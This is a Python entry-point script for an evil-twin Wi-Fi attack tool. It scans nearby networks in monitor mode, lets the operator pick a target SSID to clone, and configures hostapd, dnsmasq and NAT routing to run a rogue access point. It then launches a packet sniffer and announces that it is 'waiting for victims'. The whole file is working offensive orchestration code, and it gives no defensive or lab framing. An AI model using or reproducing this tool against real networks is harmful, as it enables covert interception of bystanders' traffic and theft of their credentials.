import os
import sys
import signal
import subprocess
from dotenv import load_dotenv

load_dotenv(os.path.join(os.path.dirname(__file__), ".env"))

INTERFACE = os.getenv("WIFI_INTERFACE", "wlan0")
OUTBOUND = "eth0"

from core.scanner import enable_monitor_mode, disable_monitor_mode, scan_networks, prompt_user_selection
from core.ap_manager import configure_interface, write_hostapd_conf, write_dnsmasq_conf, enable_routing, start_hostapd, start_dnsmasq, teardown

processes = []


def handle_exit(sig, frame):
    teardown(processes, interface=INTERFACE, outbound_interface=OUTBOUND)
    sys.exit(0)


def main():
    if os.geteuid() != 0:
        print("[!] Run as root: sudo python main.py")
        sys.exit(1)

    signal.signal(signal.SIGINT, handle_exit)
    signal.signal(signal.SIGTERM, handle_exit)

    # Step 1 — Enable monitor mode and scan
    print(f"[*] Enabling monitor mode on {INTERFACE}...")
    mon_iface = enable_monitor_mode(INTERFACE)

    print("[*] Scanning for nearby networks...")
    networks = scan_networks(mon_iface)

    if not networks:
        print("[!] No networks found. Check your adapter.")
        disable_monitor_mode(mon_iface)
        sys.exit(1)

    # Step 2 — Ask user which network to mimic
    target = prompt_user_selection(networks)
    print(f"\n[*] Target: {target['ssid']} (Channel {target.get('channel', 6)})")

    # Step 3 — Switch back to managed, configure AP
    print("[*] Disabling monitor mode...")
    disable_monitor_mode(mon_iface)

    print("[*] Configuring interface...")
    configure_interface(INTERFACE)

    print("[*] Writing AP configs...")
    write_hostapd_conf(target["ssid"], target.get("channel", 6), INTERFACE)
    write_dnsmasq_conf(INTERFACE)

    print("[*] Enabling routing and NAT...")
    enable_routing(OUTBOUND)

    print("[*] Starting hostapd...")
    processes.append(start_hostapd())

    print("[*] Starting dnsmasq...")
    processes.append(start_dnsmasq())

    # Step 4 — Start sniffer
    print("[*] Starting sniffer...")
    sniffer = subprocess.Popen([sys.executable, "core/sniffer.py"])
    processes.append(sniffer)

    print(f"\n[+] Rogue AP '{target['ssid']}' is live. Waiting for victims...")
    print("[*] Press Ctrl+C to stop.\n")

    # Keep running until Ctrl+C
    for p in processes:
        p.wait()


if __name__ == "__main__":
    main()
